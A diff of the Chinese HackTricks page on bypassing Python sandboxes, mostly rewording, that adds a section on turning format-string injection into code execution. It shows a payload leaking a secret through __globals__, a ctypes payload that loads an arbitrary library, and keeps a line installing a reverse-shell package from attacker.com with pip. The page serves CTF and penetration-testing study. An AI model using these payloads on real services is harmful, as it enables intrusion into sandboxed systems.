@@ -1,8 +1,8 @@
 # 绕过 Python 沙箱
 
 {% hint style="success" %}
-学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -66,7 +66,7 @@ Python 尝试 **首先从当前目录加载库**（以下命令将打印 python 
 
 ### 默认包
 
-你可以在这里找到 **预安装包的列表**: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+你可以在这里找到 **预安装包的列表**： [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
 请注意，从一个 pickle 中你可以使 python 环境 **导入系统中安装的任意库**。\
 例如，以下 pickle 在加载时将导入 pip 库以使用它：
 ```python
@@ -97,7 +97,7 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
 {% hint style="info" %}
-这个包叫做 `Reverse`。然而，它是特别制作的，以便当您退出反向 shell 时，其余的安装将失败，因此您**在离开时不会在服务器上留下任何额外的 python 包**。
+这个包被称为 `Reverse`。然而，它是特别制作的，以便当您退出反向 shell 时，其余的安装将失败，因此您**在离开时不会在服务器上留下任何额外的 python 包**。
 {% endhint %}
 
 ## Eval-ing python code
@@ -195,7 +195,7 @@ class _:pass
 
 如果你可以 **声明一个类** 并 **创建该类的对象**，你可以 **编写/覆盖不同的方法**，这些方法可以在 **不需要直接调用它们** 的情况下 **被触发**。
 
-#### 使用自定义类的 RCE
+#### RCE 与自定义类
 
 你可以修改一些 **类方法**（_通过覆盖现有类方法或创建一个新类_），使它们在 **被触发** 时 **执行任意代码**，而无需直接调用它们。
 ```python
@@ -329,10 +329,10 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### No Builtins
 
-当你没有 `__builtins__` 时，你将无法导入任何内容，甚至无法读取或写入文件，因为 **所有的全局函数**（如 `open`、`import`、`print`...）**都没有加载**。\
-然而，**默认情况下，python 会在内存中导入很多模块**。这些模块看似无害，但其中一些 **也导入了危险** 的功能，可以被访问以获得 **任意代码执行**。
+当你没有 `__builtins__` 时，你将无法导入任何内容，甚至无法读取或写入文件，因为 **所有全局函数**（如 `open`、`import`、`print`...）**都没有加载**。\
+然而，**默认情况下，python 会在内存中导入很多模块**。这些模块看起来可能是良性的，但其中一些 **也导入了危险** 的功能，可以被访问以获得 **任意代码执行**。
 
-在以下示例中，你可以观察到如何 **滥用** 一些被加载的 "**无害**" 模块，以 **访问** **危险** **功能**。 
+在以下示例中，你可以观察到如何 **滥用** 一些加载的 "**良性**" 模块，以 **访问** **危险** **功能**。 
 
 **Python2**
 ```python
@@ -374,7 +374,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals) 用于查找数十/**数百**个 **地方**，您可以找到 **内置函数**。
+[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals) 用于查找数十/**数百**个 **位置**，您可以找到 **内置函数**。
 
 #### Python2 和 Python3
 ```python
@@ -420,7 +420,7 @@ class_obj.__init__.__globals__
 
 ## 发现任意执行
 
-在这里，我想解释如何轻松发现 **更危险的功能** 并提出更可靠的利用方式。
+在这里，我想解释如何轻松发现 **更危险的功能** 并提出更可靠的利用方法。
 
 #### 通过绕过访问子类
 
@@ -517,7 +517,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-此外，如果您认为**其他库**可能能够**调用函数以执行命令**，我们还可以**通过函数名称过滤**可能的库：
+此外，如果您认为**其他库**可能能够**调用函数以执行命令**，我们还可以在可能的库中**按函数名称过滤**：
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -553,7 +553,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## 递归搜索内置对象、全局变量...
 
 {% hint style="warning" %}
-这真是**太棒了**。如果你**正在寻找像 globals、builtins、open 或其他任何对象**，只需使用这个脚本**递归查找可以找到该对象的地方。**
+这真是**太棒了**。如果你**正在寻找像 globals、builtins、open 或其他任何对象**，只需使用这个脚本来**递归查找可以找到该对象的地方。**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -678,12 +678,7 @@ main()
 
 ## Python 格式字符串
 
-如果您**发送**一个**字符串**给 python，该字符串将被**格式化**，您可以使用 `{}` 来访问**python 内部信息。** 您可以使用之前的示例来访问全局变量或内置函数，例如。
-
-{% hint style="info" %}
-然而，有一个**限制**，您只能使用符号 `.[]`，因此您**无法执行任意代码**，只能读取信息。\
-_**如果您知道如何通过此漏洞执行代码，请与我联系。**_
-{% endhint %}
+如果您**发送**一个将要**格式化**的**字符串**给python，您可以使用`{}`来访问**python内部信息。** 您可以使用之前的示例来访问全局变量或内置函数，例如。
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -703,7 +698,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-注意你可以通过 **点** 的方式正常 **访问属性**，例如 `people_obj.__init__`，而 **字典元素** 则可以用 **括号** 访问，不需要引号 `__globals__[CONFIG]`。
+注意你可以通过 **点** 的方式正常 **访问属性**，例如 `people_obj.__init__`，而用 **括号** 访问 **字典元素**，不带引号 `__globals__[CONFIG]`。
 
 还要注意，你可以使用 `.__dict__` 来枚举对象的元素 `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`。
 
@@ -743,14 +738,58 @@ return 'HAL 9000'
 
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
+
+# Example from https://corgi.rip/posts/buckeye-writeups/
+secret_variable = "clueless"
+x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
+str(x) # Out: clueless
 ```
+### 从格式到 RCE 加载库
+
+根据[**这篇文章中的 TypeMonkey 挑战**](https://corgi.rip/posts/buckeye-writeups/)，可以通过滥用 Python 中的格式字符串漏洞从磁盘加载任意库。
+
+作为提醒，每当在 Python 中执行某个操作时，都会执行某个函数。例如 `2*3` 将执行 **`(2).mul(3)`** 或 **`{'a':'b'}['a']`** 将是 **`{'a':'b'}.__getitem__('a')`**。
+
+在[**没有调用的 Python 执行**](./#python-execution-without-calls)部分中还有更多类似的内容。
+
+Python 格式字符串漏洞不允许执行函数（不允许使用括号），因此无法像 `'{0.system("/bin/sh")}'.format(os)` 这样获得 RCE。\
+然而，可以使用 `[]`。因此，如果一个常见的 Python 库具有 **`__getitem__`** 或 **`__getattr__`** 方法来执行任意代码，则可以滥用它们来获得 RCE。
+
+在 Python 中寻找这样的 gadget，文章提供了这个[**Github 搜索查询**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code)。在这里他找到了这个[例子](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463)：
+```python
+class LibraryLoader(object):
+def __init__(self, dlltype):
+self._dlltype = dlltype
+
+def __getattr__(self, name):
+if name[0] == '_':
+raise AttributeError(name)
+try:
+dll = self._dlltype(name)
+except OSError:
+raise AttributeError(name)
+setattr(self, name, dll)
+return dll
+
+def __getitem__(self, name):
+return getattr(self, name)
+
+cdll = LibraryLoader(CDLL)
+pydll = LibraryLoader(PyDLL)
+```
+这个工具允许**从磁盘加载库**。因此，需要以某种方式**写入或上传库**，以便正确编译到被攻击的服务器。
+```python
+'{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
+```
+挑战实际上利用了服务器中的另一个漏洞，该漏洞允许在服务器磁盘上创建任意文件。
+
 ## 解剖 Python 对象
 
 {% hint style="info" %}
 如果你想深入了解 **python 字节码**，请阅读这篇关于该主题的 **精彩** 文章：[**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-在某些 CTF 中，你可能会被提供一个 **自定义函数的名称，其中包含标志**，你需要查看 **函数** 的 **内部** 以提取它。
+在一些 CTF 中，你可能会被提供一个 **自定义函数的名称，其中包含标志**，你需要查看 **函数** 的 **内部** 以提取它。
 
 这是要检查的函数：
 ```python
@@ -785,7 +824,7 @@ CustomClassObject.__class__.__init__.__globals__
 
 ### **访问函数代码**
 
-**`__code__`** 和 `func_code`：您可以 **访问** 这个 **属性** 来 **获取函数的代码对象**。
+**`__code__`** 和 `func_code`：您可以 **访问** 函数的 **这个属性** 来 **获取函数的代码对象**。
 ```python
 # In our current example
 get_flag.__code__
@@ -898,7 +937,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## 编译 Python
 
 现在，让我们想象一下，您可以以某种方式**转储您无法执行的函数的信息**，但您**需要**去**执行**它。\
-就像在以下示例中，您**可以访问该函数的代码对象**，但仅通过读取反汇编，您**不知道如何计算标志**（_想象一个更复杂的 `calc_flag` 函数_）
+就像在以下示例中，您**可以访问该函数的代码对象**，但仅仅通过读取反汇编，您**不知道如何计算标志**（_想象一个更复杂的 `calc_flag` 函数_）
 ```python
 def get_flag(some_input):
 var1=1
@@ -998,7 +1037,7 @@ f(42)
 ```
 ## 反编译已编译的 Python
 
-使用像 [**https://www.decompiler.com/**](https://www.decompiler.com) 这样的工具，可以 **反编译** 给定的已编译 Python 代码。
+使用像 [**https://www.decompiler.com/**](https://www.decompiler.com) 这样的工具可以 **反编译** 给定的已编译 Python 代码。
 
 **查看这个教程**：
 
@@ -1031,10 +1070,9 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-
 {% hint style="success" %}
-学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -1042,7 +1080,7 @@ print(f"\nNot a Super User!!!\n")
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
 * **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
